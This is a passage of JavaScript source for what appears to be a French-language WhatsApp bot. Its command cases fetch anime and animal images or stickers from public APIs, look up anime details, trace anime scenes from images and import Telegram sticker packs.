                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animetickle': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animegecg': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'dogwoof': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case '8ballpool': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'goosebird': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefeed': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeavatar': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'lizardpic': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'catmeow': {
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'anime': {
if (!text) return replygckev(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await KevStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygckev(`Could not find`)
let animetxt = `
🎀 *Titre: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Promue sur: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Statut: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularitey: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${text}*_\n\n${animetxt}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:anime.picture}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🍁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                
                }
                break
			case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return replygckev("*Veuillez repondre a une image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return replygckev("*Erreur: nous ne pouvons pas retracer cet anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similaritey:* ${similarity.toFixed(2)}%\n`;
    message += `*Temps:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    replygckev("*Erreur: Nous ne pouvons pas retracer cet anime ni envoyer de video.*");
  }
};
break
			case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
Kev.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
			case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Kev.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return KevStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let kevresources = await Telesticker(args[0])
		await replygckev(`Send ${kevresources.length} stickers...`)
		if (m.isGroup && kevresources.length > 30) {
			await replygckev('Nombre de sticker superieur a 30, Sylvers MD les envera en dm.')
			for (let i = 0; i < kevresources.length; i++) {
				Kev.sendMessage(m.sender, { sticker: { url: kevresources[i].url }})
			}
		} else {
			for (let i = 0; i < kevresources.length; i++) {
				Kev.sendMessage(m.chat, { sticker: { url: kevresources[i].url }})
			}
		}
	} else replygckev(`Ou est le lien du sticker Telegram ?\nExemple. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
			case 'mon-sondage':{
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
